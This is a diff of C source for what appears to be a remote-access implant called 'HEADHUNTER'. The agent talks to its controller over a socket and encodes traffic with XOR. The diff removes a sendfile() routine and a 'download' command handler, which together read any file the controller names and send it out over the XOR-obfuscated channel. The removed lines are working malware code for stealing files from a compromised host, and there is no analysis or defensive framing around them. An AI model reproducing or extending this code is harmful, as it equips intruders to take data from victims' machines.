@@ -20,25 +20,6 @@ char buf[MAXBUF];
 int bufsize;
 int sleeptime = 5;
 
-int sendfile(FILE* fp, int fd, char* key)
-{
-        char data[SIZE] = {0};
-        
-        while(fgets(data, SIZE, fp) != NULL) {
-                char* xordata = XOR(data, key, SIZE, strlen(key));
-                if (send(fd, xordata, SIZE, 0) == -1) {
-                        exit(1);
-                }
-                bzero(data, SIZE);
-                free(xordata);
-        }
-        char* eof = "--HEADHUNTER EOF--";
-        char* xoreof = XOR(eof, key, strlen(eof), strlen(key));
-        send(fd, xoreof, strlen(eof), 0);
-        free(xoreof);
-        return 0;
-}
-
 int main(void)
 {
 	signal(SIGCHLD, SIG_IGN);
@@ -111,38 +92,6 @@ int main(void)
 
 				waitpid(child_pid, &status, WNOHANG);
 
-			}
-			else if(str_starts_with(xorbuf, "download") == 0){
-			
-				char* cmd = split(xorbuf, " ");
-				cmd[strlen(cmd)-1] = '\0'; // Remove newline
-				FILE* fp;
-				fp = fopen(cmd, "r");
-				if(fp == NULL){
-					
-					char* openerr = "\e[1;31m[-]\e[0m Error opening file\n";
-					char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
-					write(sock, xoropenerr, strlen(openerr));
-					free(xoropenerr);
-					break;
-
-				}
-				else{
-
-					char* download = "--HUNTER DOWNLOAD--";
-					char* xordownload = XOR(download, key, strlen(download), keylen);
-					char confirm[5];
-					write(sock, xordownload, strlen(download));
-					read(sock, confirm, 5);
-					char* xorconfirm = XOR(confirm, key, strlen(confirm), keylen);
-					if(strcmp(xorconfirm, "OK") == 0){
-						sendfile(fp, sock, key);
-					}
-					else{
-						continue;
-					}
-				}
-			
 			}
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
